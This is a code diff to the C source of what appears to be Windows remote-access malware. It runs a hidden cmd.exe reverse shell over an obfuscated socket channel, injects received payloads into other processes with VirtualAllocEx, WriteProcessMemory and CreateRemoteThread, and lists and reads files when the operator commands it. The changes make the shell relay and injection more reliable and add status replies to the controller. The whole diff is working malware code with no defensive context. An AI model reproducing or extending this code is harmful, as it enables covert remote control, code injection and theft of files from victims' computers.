@@ -21,6 +21,8 @@ HANDLE g_hChildStd_IN_Wr = NULL;
 HANDLE g_hChildStd_OUT_Rd = NULL;
 HANDLE g_hChildStd_OUT_Wr = NULL;
 
+int started = 0;
+
 #define BUFFER_SIZE 4096
 #define SMALL_SLEEP_TIME 50
 
@@ -40,6 +42,9 @@ DWORD WINAPI redirect_i_thread(LPVOID lpParameter) {
 		else if (bytesRead == SOCKET_ERROR) {
 			break;
 		}
+		else if (g_hChildStd_IN_Wr == NULL) {
+			break;
+		}
 		else {
 			Sleep_(SMALL_SLEEP_TIME);
 		}
@@ -50,15 +55,28 @@ DWORD WINAPI redirect_i_thread(LPVOID lpParameter) {
 }
 
 DWORD WINAPI redirect_o_thread(LPVOID lpParameter) {
+	started = 1;
 	SOCKET sock = (SOCKET)lpParameter;
 	char* buffer = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
 	DWORD bytesRead = 0;
+	DWORD bytesAvailable = 0;
 
 	while (1) {
-		// Read data from the child process's stdout pipe
-		if (Api.ReadFile(g_hChildStd_OUT_Rd, buffer, BUFFER_SIZE, &bytesRead, NULL)) {
-			Api.send(sock, CAESAR(buffer), (int)bytesRead, 0);
-			//Api.send(sock, buffer, bytesRead, 0);
+		if (Api.PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL)) {
+			if (bytesAvailable > 0) {
+				if (Api.ReadFile(g_hChildStd_OUT_Rd, buffer, min(BUFFER_SIZE, bytesAvailable), &bytesRead, NULL)) {
+					Api.send(sock, CAESAR(buffer), (int)bytesRead, 0);
+				}
+				else {
+					break;
+				}
+			}
+			else {
+				Sleep_(SMALL_SLEEP_TIME);
+			}
+		}
+		else if (g_hChildStd_OUT_Rd == NULL) {
+			break;
 		}
 		else {
 			DWORD error = Api.GetLastError();
@@ -68,7 +86,6 @@ DWORD WINAPI redirect_o_thread(LPVOID lpParameter) {
 			}
 		}
 	}
-
 	Api.HeapFree(_crt_heap, 0, buffer);
 	return 0;
 }
@@ -87,6 +104,8 @@ DWORD WINAPI watch_process(LPVOID lpParameter) {
 
 	while (1) {
 		n = Api.recv(args->sock, buffer, sizeof(buffer), MSG_PEEK);
+		if (Api.WaitForSingleObject(args->process, 0) == WAIT_OBJECT_0)
+			return 0;
 		if (n > 0) {
 			// There is data available on the socket, so the connection is still alive
 		}
@@ -303,6 +322,7 @@ retry:
 			size_t fsize = 0;
 			char *file = upload_file_to_mem(sock, &fsize);
 			if (file == NULL) {
+				Api.send(sock, "fail", strlen("fail"), 0);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -318,6 +338,7 @@ retry:
 			Api.HeapFree(_crt_heap, 0, arch);
 
 			if (proc == NULL) {
+				Api.send(sock, "fail", strlen("fail"), 0);
 				Api.HeapFree(_crt_heap, 0, file);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -325,6 +346,7 @@ retry:
 
 			LPVOID addr = Api.VirtualAllocEx(proc, NULL, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 			if (addr == NULL) {
+				Api.send(sock, "fail", strlen("fail"), 0);
 				Api.HeapFree(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
@@ -332,6 +354,7 @@ retry:
 			}
 
 			if (Api.WriteProcessMemory(proc, addr, file, fsize, NULL) == 0) {
+				Api.send(sock, "fail", strlen("fail"), 0);
 				Api.HeapFree(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
@@ -340,6 +363,7 @@ retry:
 
 			HANDLE hThread = Api.CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
 			if (hThread == NULL) {
+				Api.send(sock, "fail", strlen("fail"), 0);
 				Api.HeapFree(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
@@ -349,6 +373,7 @@ retry:
 			Api.HeapFree(_crt_heap, 0, file);
 			Api.CloseHandle(proc);
 			Api.CloseHandle(hThread);
+			Api.send(sock, "ok", strlen("ok"), 0);
 		}
 #endif
 		if (strncmp_(server_reply, "ljydknqjdqnxy", strlen("ljydknqjdqnxy")) == 0) { //get_file_list
@@ -399,7 +424,7 @@ retry:
 				goto retry;
 			}
 
-			HANDLE hFile = Api.CreateFileA(CAESAR_DECRYPT(path), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+			HANDLE hFile = Api.CreateFileA(CAESAR_DECRYPT(path), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 			Api.HeapFree(_crt_heap, 0, path);
 
 			if (hFile == NULL)
@@ -444,17 +469,21 @@ retry:
 		}
 
 		if (strncmp_(server_reply, "xmjqq", strlen("xmjqq")) == 0) { //shell
+			started = 0;
 			// Set the socket as standard output and error
 			SECURITY_ATTRIBUTES sa;
 			sa.nLength = sizeof(SECURITY_ATTRIBUTES);
 			sa.bInheritHandle = TRUE;
 			sa.lpSecurityDescriptor = NULL;
 			if (!Api.CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0)) {
+				Api.send(sock, "fail", strlen("fail"), 0);
 				SendShellEndedSignal(sock);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 			if (!Api.CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0)) {
+				Api.CloseHandle(g_hChildStd_IN_Rd);
+				Api.send(sock, "fail", strlen("fail"), 0);
 				SendShellEndedSignal(sock);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -463,6 +492,14 @@ retry:
 			// Create a thread to read from the pipes and write to the socket
 			HANDLE hThread = Api.CreateThread(NULL, 0, &redirect_i_thread, (LPVOID)sock, 0, NULL);
 			HANDLE hThread2 = Api.CreateThread(NULL, 0, &redirect_o_thread, (LPVOID)sock, 0, NULL);
+			if (hThread == NULL || hThread2 == NULL) {
+				Api.CloseHandle(g_hChildStd_OUT_Wr);
+				Api.CloseHandle(g_hChildStd_IN_Rd);
+				Api.send(sock, "fail", strlen("fail"), 0);
+				SendShellEndedSignal(sock);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
 
 			// Create the process
 			STARTUPINFO si;
@@ -477,6 +514,7 @@ retry:
 			memset_(&pi, 0, sizeof(PROCESS_INFORMATION));
 
 			if (!Api.CreateProcessW(NULL, cmd_char, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { //cmd.exe
+				Api.send(sock, "fail", strlen("fail"), 0);
 				SendShellEndedSignal(sock);
 				Api.CloseHandle(g_hChildStd_OUT_Wr);
 				Api.CloseHandle(g_hChildStd_IN_Rd);
@@ -497,6 +535,31 @@ retry:
 			watch_process_args args = { sock, pi.hProcess };
 			HANDLE hThread3 = Api.CreateThread(NULL, 0, &watch_process, &args, 0, NULL);
 
+			if (started == 0) {
+				SendShellEndedSignal(sock);
+
+				Api.TerminateProcess(pi.hProcess, 0);
+				Api.CloseHandle(pi.hProcess);
+				Api.CloseHandle(pi.hThread);
+				Api.CloseHandle(g_hChildStd_OUT_Wr);
+				Api.CloseHandle(g_hChildStd_IN_Rd);
+				g_hChildStd_OUT_Wr = NULL;
+				g_hChildStd_IN_Rd = NULL;
+
+				if (hThread != NULL) {
+					Api.TerminateThread(hThread, 0);
+					Api.CloseHandle(hThread);
+				}
+				if (hThread2 != NULL) {
+					Api.TerminateThread(hThread2, 0);
+					Api.CloseHandle(hThread2);
+				}
+				if (hThread3 != NULL) {
+					Api.TerminateThread(hThread3, 0);
+					Api.CloseHandle(hThread3);
+				}
+				continue;
+			}
 			// Wait for the process to finish
 			Api.WaitForSingleObject(pi.hProcess, INFINITE);
 
@@ -507,6 +570,8 @@ retry:
 			Api.CloseHandle(pi.hThread);
 			Api.CloseHandle(g_hChildStd_OUT_Wr);
 			Api.CloseHandle(g_hChildStd_IN_Rd);
+			g_hChildStd_OUT_Wr = NULL;
+			g_hChildStd_IN_Rd = NULL;
 
 			if (hThread != NULL) {
 				Api.TerminateThread(hThread, 0);
